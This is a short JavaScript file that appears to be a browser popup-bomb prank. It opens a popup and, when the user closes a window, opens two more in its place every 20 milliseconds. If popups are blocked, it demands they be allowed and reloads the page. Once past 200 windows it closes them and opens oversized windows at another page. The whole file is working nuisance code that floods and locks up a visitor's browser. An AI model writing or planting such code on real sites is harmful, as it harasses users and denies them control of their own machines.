var windows = [];
function generateWindow(x,y,w,h){
    windows.push(window.open("./head",'_blank', 'width=' + (w||1000) + ',height=' + (h||500) + ',left=' + (x||0) + ',top=' + (y||0)));
}
function generateRandomWindow(){
    generateWindow(Math.random()*1000,Math.random()*500, Math.random()*400+800, Math.random()*200+400);
}
generateWindow(500,500,1000,1000);
if(!windows[0]){
    alert("Please allow popups");
    window.location.reload();
} else {
    console.log(windows[0])
    setInterval(function(){
        for(var i = windows.length-1; i > -1; i --){
            if(!windows[i]||!windows[i].parent){
                if(windows.length<=1){
                    generateWindow(500,500,1000,1000);
                } else {
                    generateRandomWindow();
                }
                generateRandomWindow();
                windows.splice(i, 1);
            }
        }
        if(windows.length>200) {
            for(var i = 0; i < windows.length; i ++){
                windows[i].close();
            }
            for(var i = 0; i < 3; i ++){
                window.open("./win", "_blank", "width=2000,h=2000");
            }
            window.close();
        }
    }, 20);
}
